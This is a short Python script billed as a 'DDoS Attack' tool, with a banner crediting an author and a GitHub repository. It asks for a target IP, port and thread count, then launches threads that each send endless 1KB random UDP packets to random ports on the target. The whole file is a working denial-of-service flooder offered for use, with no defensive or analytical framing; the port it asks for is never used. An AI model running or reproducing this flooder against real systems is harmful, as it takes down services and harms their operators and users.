import os
import time
import socket
import random
import threading
from datetime import datetime

# Clear screen and display banner
os.system("clear")
os.system("figlet DDoS Attack")
print("Author   : DirtyHeroes")
print("Github   : https://github.com/palacita135/DDoS")
print()

# User input
ip = input("IP Target: ")
port = int(input("Port: "))
thr = int(input("Threads: "))  # Number of threads to speed up attack

# Attack startup progress bar
os.system("clear")
os.system("figlet Attack Starting")
progress = ["[                    ] 0% ", "[=====               ] 25%", "[==========          ] 50%", "[===============     ] 75%", "[====================] 100%"]
for step in progress:
    print(step)
    time.sleep(2)

# UDP Attack function
def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)  # 1KB random data
    sent = 0
    while True:
        try:
            rand_port = random.randint(1, 65535)  # Randomize ports
            sock.sendto(payload, (ip, rand_port))
            sent += 1
            print(f"Sent {sent} packets to {ip} through port: {rand_port}")
        except Exception as e:
            print(f"Error: {e}")
            break

# Launch multiple attack threads
for i in range(thr):
    thread = threading.Thread(target=attack)
    thread.start()
